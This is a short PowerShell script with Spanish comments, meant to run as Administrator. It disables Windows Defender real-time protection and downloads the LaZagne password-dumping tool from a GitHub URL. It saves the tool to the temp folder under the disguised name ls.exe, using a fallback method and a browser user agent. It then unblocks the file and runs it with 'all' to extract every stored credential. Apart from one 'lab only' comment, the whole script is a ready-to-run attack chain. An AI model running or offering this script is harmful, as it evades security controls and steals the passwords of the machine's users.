# Ejecuta esto en PowerShell (Administrador)
$repoUrl = "https://github.com/kobasky17/lagzane.exe-for-windows.git"
$exeUrl = "https://raw.githubusercontent.com/kobasky17/lagzane.exe-for-windows/master/laZagne.exe"
$outputPath = "$env:TEMP\ls.exe"

# 1. Desactivar protección temporal (solo laboratorio)
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# 2. Descargar usando diferentes métodos
try {
    # Método 1: Invoke-WebRequest
    Write-Host "Descargando LaZagne..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -UserAgent "Mozilla/5.0"
} catch {
    # Método 2: WebClient alternativo
    Write-Host "Método 1 falló, intentando alternativa..." -ForegroundColor Red
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
    $webClient.DownloadFile($exeUrl, $outputPath)
}

# 3. Desbloquear el archivo
if (Test-Path $outputPath) {
    Write-Host "Desbloqueando archivo..." -ForegroundColor Green
    Unblock-File -Path $outputPath -ErrorAction SilentlyContinue
    
    # 4. Ejecutar
    Write-Host "Ejecutando LaZagne..." -ForegroundColor Cyan
    Start-Process $outputPath -ArgumentList "all" -Wait
} else {
    Write-Host "Error: No se pudo descargar el archivo" -ForegroundColor Red
}